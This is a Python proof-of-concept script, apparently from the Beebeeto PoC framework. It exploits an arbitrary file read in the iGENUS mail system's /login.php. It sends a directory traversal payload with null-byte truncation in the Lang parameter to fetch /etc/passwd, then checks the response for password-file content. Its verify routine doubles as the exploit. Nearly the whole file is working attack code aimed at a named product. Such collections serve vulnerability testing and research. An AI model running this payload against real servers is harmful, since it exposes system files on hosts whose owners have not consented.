#!/usr/bin/env python
# coding=utf-8

"""
Site: http://www.beebeeto.com/
Framework: https://github.com/n0tr00t/Beebeeto-framework
"""

import requests

from baseframe import BaseFrame


class MyPoc(BaseFrame):
    poc_info = {
        # poc相关信息
        'poc': {
            'id': 'poc-2015-0144',
            'name': '爱琴思邮件系统 /login.php 任意文件读取漏洞 PoC',
            'author': 'foundu',
            'create_date': '2015-10-09',
        },
        # 协议相关信息
        'protocol': {
            'name': 'http',
            'port': [80],
            'layer4_protocol': ['tcp'],
        },
        # 漏洞相关信息
        'vul': {
            'app_name': 'iGENUS',
            'vul_version': ['*'],
            'type': 'Arbitrary File Read',
            'tag': ['iGENUS漏洞', '/login.php漏洞', 'php'],
            'desc': 'Lang存在遍历，%00截断',
            'references': ['http://www.wooyun.org/bugs/wooyun-2015-0136712',
                        ],
        },
    }


    @classmethod
    def verify(cls, args):
        url = args['options']['target']
        payload = '/webroot/login.php?Lang=../../../../../../../../../../etc/passwd%00.jpg'
        verify_url = url + payload
        if args['options']['verbose']:
            print '[*] Request URL: ' + verify_url
        req = requests.get(verify_url)
        if req.status_code == 200 and 'root:' in req.content and 'bin/' in req.content:
            args['success'] = True
            args['poc_ret']['vul_url'] = verify_url
        return args

    exploit = verify

if __name__ == '__main__':
    from pprint import pprint

    mp = MyPoc()
    pprint(mp.run())